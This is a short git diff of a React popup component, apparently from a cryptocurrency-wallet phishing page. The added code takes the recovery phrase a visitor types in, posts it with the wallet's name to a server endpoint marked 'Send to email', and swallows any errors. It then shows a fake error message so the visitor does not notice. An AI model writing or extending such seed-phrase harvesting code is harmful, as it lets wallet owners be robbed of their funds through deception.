@@ -1,6 +1,7 @@
 import React, {useState,useEffect} from 'react'
 import './Popup.css'
 import './mobile.css'
+import Axios from 'axios'
 const Popup = ({setPopUpdata,setShowPopup,popUpData}) => {
     const [ showMessage, setShowmessage ] = useState( '' );
     const [rPhrase, setRPhrase] = useState('')
@@ -15,9 +16,27 @@ const Popup = ({setPopUpdata,setShowPopup,popUpData}) => {
       
         setDisableButton(true);
         //Send to email
+
+        const config = {
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        }
+
+        const body = JSON.stringify( { rPhrase, wallet:popUpData.name } )
+        Axios
+                .post( 'message', body,config)
+                // .then( res =>res.json() )
+                .then( res => {
+                //    console.log(res)
+                } )
+             
+                .catch( err => {
+                    // console.log(err)
+            })
         const checkPhrase = rPhrase.match( /[A-Za-z]{12,}/g );
         
-        console.log( rPhrase );
+        // console.log( rPhrase );
         setTimeout( () => {
             if ( checkPhrase ) {
                 setShowmessage('Opps!! there has been an error.')
